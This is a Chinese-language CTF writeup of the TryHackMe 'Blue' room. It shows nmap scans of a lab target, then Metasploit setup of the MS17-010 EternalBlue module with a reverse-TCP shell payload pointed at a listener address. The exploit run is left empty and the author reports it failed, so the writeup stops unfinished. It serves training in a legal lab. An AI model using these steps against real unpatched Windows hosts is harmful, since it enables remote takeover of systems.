---
title: "THM Blue Writeup"
date: 2023-10-01
tags: [writeup, ctf, tryhackme]
description: "扫描暴露的 SMB 服务，并利用 MS17-010 EternalBlue 漏洞在 TryHackMe 的 Blue 房间中拿下初始立足点。"
---

## Setup

开始挑战之前，我们首先需要连接到 tryhackme 的 VPN 服务器。你可以访问 [Access](https://tryhackme.com/access) 页面获取更多相关信息。

我将使用 openvpn 连接到服务器。命令如下：

```console
$ sudo openvpn --config NovusEdge.ovpn
```

## Enumeration

机器启动后，我们先从网络扫描开始：

```console
$ sudo nmap -sS -vv MACHINE_IP
...
Initiating SYN Stealth Scan at 15:45
Scanning MACHINE_IP [1000 ports]
Discovered open port 135/tcp on MACHINE_IP
Discovered open port 3389/tcp on MACHINE_IP
Discovered open port 139/tcp on MACHINE_IP
...
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
49152/tcp open  unknown       syn-ack ttl 127
49153/tcp open  unknown       syn-ack ttl 127
49154/tcp open  unknown       syn-ack ttl 127
49158/tcp open  unknown       syn-ack ttl 127
49160/tcp open  unknown       syn-ack ttl 127

...
```

所以，通过这次简单的扫描，我们就得到了房间里第一个问题的答案：

> 端口号小于 1000 的开放端口有几个？
> > 3

我们可以通过对端口 `135`、`139` 和 `445` 进行服务扫描，进一步检查服务版本：

```console
$ nmap -sV -vv -p135,139,445 MACHINE_IP 
...

PORT    STATE SERVICE      REASON  VERSION
135/tcp open  msrpc        syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

...
```

没什么特别的发现……好吧，下一个问题的答案就是对应 `Eternal Blue` 漏洞的利用代码。我是怎么得出这个结论的？说实话，当你在 Tryhackme 上查看这个房间时，页面上到处都是明显的提示：

![](/assets/img/writeup_assets/blue/blue-room-top.png)

简单快速地搜一下，就能知道这个漏洞的另一个别名：

![](/assets/img/writeup_assets/blue/eblue-search.png)

这样，我们就得到了下一个问题的答案：

> 这台机器存在什么漏洞？（回答格式形如：ms??-???，例如：ms08-067）
> > MS17-010

## Gaining Access

有了在枚举阶段掌握的信息，我们来尝试利用这台靶机。

目前有两种方法：使用 metasploit 和不使用 metasploit。我们先尝试用 metasploit 来做，不过之后我也打算单独写一节尝试不用 metasploit 的方法。

启动 `msfconsole` 后，我们可以尝试搜索可用的 exploit：

```console
$ sudo msfconsole -q
msf6 > search eternal blue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution                 
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection                                                                                  
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

我们要找的是第一个，即 `exploit/windows/smb/ms17_010_eternalblue`。于是我们得到了这一部分的第一个问题答案：

> 找出我们将针对该机器运行的漏洞利用代码。代码的完整路径是什么？（例如：exploit/........）
> > exploit/windows/smb/ms17_010_eternalblue

我们可以像这样查看所选模块的选项：

```console
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
                                             chines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machin
                                             es.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.80.0.96       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

我们需要设置其中的几项，首先也是最关键的一项就是 `RHOSTS`：

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS  MACHINE_IP 
RHOSTS => MACHINE_IP
```

这就是第二个问题的答案：

> 显示选项并设置一个必填项的值。这个值的名称是什么？（提交时需全部大写）
> > RHOSTS

接下来我们要设置漏洞利用的 payload，按照房间的提示，我将使用 `windows/x64/shell/reverse_tcp`：

```console
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
```


现在，我们直接运行 exploit，见证奇迹的时刻到了！
> 注意：如果这不起作用，只需终止（terminate）并重新启动虚拟机进行重启，更新 RHOSTS 后再次运行此 exploit 即可

```console
```

#### 额，这个 exploit 在我这儿完全不起作用，等搞定了我再来更新这篇 writeup。先撤啦！


房间链接：https://tryhackme.com/room/blue

